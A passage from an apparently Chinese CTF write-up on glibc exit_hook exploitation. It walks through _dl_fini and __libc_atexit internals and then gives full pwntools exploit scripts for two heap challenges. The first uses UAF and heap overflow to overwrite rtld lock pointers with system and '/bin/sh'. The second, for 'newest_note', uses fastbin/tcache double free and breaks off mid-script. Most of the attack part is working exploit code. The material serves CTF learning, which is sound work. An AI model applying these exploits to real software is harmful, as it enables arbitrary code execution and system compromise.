i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">            assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">     the main namespace.  */</span></span><br><span class="line">            _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">                           <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">     lock.  */</span></span><br><span class="line">            __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">     the front.  */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">                        || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                                              &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                                              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                                              ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">                                (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                              / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                                ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI</span><br><span class="line">                            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">                    <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">                    <span class="keyword">if</span> (!do_audit &amp;&amp; __builtin_expect (GLRO(dl_naudit) &gt; <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="class"><span class="keyword">struct</span> <span class="title">audit_ifaces</span> *<span class="title">afct</span> =</span> GLRO(dl_audit);</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> cnt = <span class="number">0</span>; cnt &lt; GLRO(dl_naudit); ++cnt)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (afct-&gt;objclose != <span class="literal">NULL</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> *<span class="title">state</span></span></span><br><span class="line"><span class="class">                                    =</span> link_map_audit_state (l, cnt);</span><br><span class="line">                                <span class="comment">/* Return value is ignored.  */</span></span><br><span class="line">                                (<span class="keyword">void</span>) afct-&gt;objclose (&amp;state-&gt;cookie);</span><br><span class="line">                            &#125;</span><br><span class="line">                            afct = afct-&gt;next;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        do_audit = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">        _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">                          <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">                          <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">                          GL(dl_num_relocations),</span><br><span class="line">                          GL(dl_num_cache_relocations));</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是_dl_fini函数，这次重点关注的是这一段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">        || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给出两种函数的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>可以看出来这里是将_rtld_global当中的属性当作函数来进行调用的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220616185021145.png"                      alt="image-20220616185021145"                ></p><p>然而这俩属性也就是俩指针，所以我们可以修改这个指针到system，接着就是构造参数了。根据上面的调用关系可以看到最后的参数其实是</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220616185259054.png"                      alt="image-20220616185259054"                ></p><p>以上其实就是exit_hook的全部了，很简单。</p><h3 id="新的发现"><a href="#新的发现" class="headerlink" title="新的发现"></a>新的发现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ... ...</span><br><span class="line">        <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">            RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">    _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的__run_exit_handlers 函数当中存在以上代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> RUN_HOOK(NAME, ARGS)      \</span></span><br><span class="line"><span class="meta">do &#123;      \</span></span><br><span class="line"><span class="meta">  void *const *ptr;      \</span></span><br><span class="line"><span class="meta">  for (ptr = (void *const *) symbol_set_first_element (NAME);      \</span></span><br><span class="line"><span class="meta">       ! symbol_set_end_p (NAME, ptr); ++ptr)      \</span></span><br><span class="line"><span class="meta">    (*(__##NAME##_hook_function_t *) *ptr) ARGS;      \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure><p>跟进发现是可以循环执行内容的一个函数，所以这里如果可以修改掉__libc_atexit就可以getshell。</p><p>然后实际的做题过程中会发现并没有__libc_atexit这个符号，因为这不是一个全局变量，所以是找不到的，但是通过汇编分析</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220616192546678.png"                      alt="image-20220616192546678"                ></p><p>可以发现是这条语句在调用hook</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220616192609058.png"                      alt="image-20220616192609058"                ></p><p>在最后的实际调用也可以看到确实是这样的，这里的rbx也就是上面的__libc_atexit指针。</p><h3 id="总结以上利用方式"><a href="#总结以上利用方式" class="headerlink" title="总结以上利用方式"></a>总结以上利用方式</h3><p>在最后总结一下以上两种利用方式，第一种利用方式的攻击层面其实是发生在ld层面的，所以也就存在了一些奇奇怪怪的因素(至少当初写house of banana总是会出现)但是这一种利用方式是可以我们控制其参数的。第二种利用方式就发生在libc层面了，所以我们修改起来也就更加的得心应手一点，不过坏处就是我们没法控制其参数。</p><h2 id="一次awd训练的pwn"><a href="#一次awd训练的pwn" class="headerlink" title="一次awd训练的pwn"></a>一次awd训练的pwn</h2><p>题目的漏洞很明显，在delete函数存在UAF，并且在edit函数存在堆溢出，不过恶心的是没有show函数并且题目使用的输出函数都是write导致我们没法使用_IO_FILE来进行泄漏，虽然glibc的版本是2.27但是malloc_hook和free_hook初始值都是0没法进行partial write所以这里就需要使用到exit_hook了。</p><p>这里因为漏洞点很简单就不一步一步分析了，就是实现unsored bin和tcache中存在同一使用的chunk，进行partial write达成以下情况</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220617141940026.png"                      alt="image-20220617141940026"                ></p><p>然后利用同样的方法修改掉他的参数也就是<code>_rtld_global._dl_load_lock.mutex</code> 的值为<code>/bin/sh\x00</code>即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, data=<span class="string">b&#x27;\n&#x27;</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit_hook = <span class="number">0x62af60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            edit(<span class="number">0</span>, <span class="number">16</span>, flat(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            delete(<span class="number">0</span>)</span><br><span class="line">        create(<span class="number">0x80</span>, <span class="string">b&#x27;\x60\xaf\x82&#x27;</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x100</span>, <span class="string">b&#x27;\x20\xf4\x24&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x110</span>)</span><br><span class="line">        create(<span class="number">0x110</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            edit(<span class="number">5</span>, <span class="number">16</span>, flat(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            delete(<span class="number">5</span>)</span><br><span class="line">        create(<span class="number">0x90</span>, <span class="string">b&#x27;\x68\xa9\x82&#x27;</span>)</span><br><span class="line">        create(<span class="number">0x110</span>)</span><br><span class="line">        create(<span class="number">0x110</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">        <span class="comment"># gdb.attach(r)</span></span><br><span class="line">        r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br></pre></td></tr></table></figure><h2 id="国赛newest-note"><a href="#国赛newest-note" class="headerlink" title="国赛newest_note"></a>国赛newest_note</h2><p>这道题目其实存在一个非常明显，可惜当时我没有发现的漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_4198 = input_int();</span><br><span class="line">chunk_arr = <span class="built_in">malloc</span>(<span class="number">8</span> * dword_4198);</span><br></pre></td></tr></table></figure><p>也就是在开始的时候可以创建任意大小的chunk，所以可以直接泄露地址，不过即便是没注意到这个漏洞也是可以做题的，不过因为没有接触过exit_hook所以我当时的思路是劫持栈进行ROP，后面发现实现不了。</p><h3 id="在不用mmap生成chunk泄露的情况下"><a href="#在不用mmap生成chunk泄露的情况下" class="headerlink" title="在不用mmap生成chunk泄露的情况下"></a>在不用mmap生成chunk泄露的情况下</h3><p>在glibc-2.27_ubuntu1.2_amd64之后tcache就存在double free的检测了，结合题目这里是没法直接在tcache当中进行double free的，所以我们只能将double free发生在fastbin当中</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>使用这种方法其实是比较麻烦的，首先将tcache占满，那么下一次释放的chunk会进入fastbin，然后create一个chunk，拿出tcache中的一个chunk，接着再释放一次fastbin当中的chunk，就达到了在tcacheh和fastbin当中存在同一个chunk的情况了，接着伪造fastbin，利用<a href="fastbin_reverse_into_tcache">fastbin_reverse_into_tcache</a>将伪造的链放入tcache即可进一步利用了。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;45&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    create(i, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">create(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((heap_base + <span class="number">0x610</span>) &gt;&gt; <span class="number">12</span>))</span><br><span class="line">key = heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">18</span>, p64(key ^ (heap_base + <span class="number">0x560</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(key ^ (heap_base + <span class="number">0x480</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">19</span>, p64(key ^ (heap_base + <span class="number">0x460</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(key ^ (heap_base + <span class="number">0x420</span>)))</span><br><span class="line">create(<span class="number">19</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(key))</span><br><span class="line">create(<span class="number">20</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">21</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))</span><br><span class="line"></span><br><span class="line">delete(<span 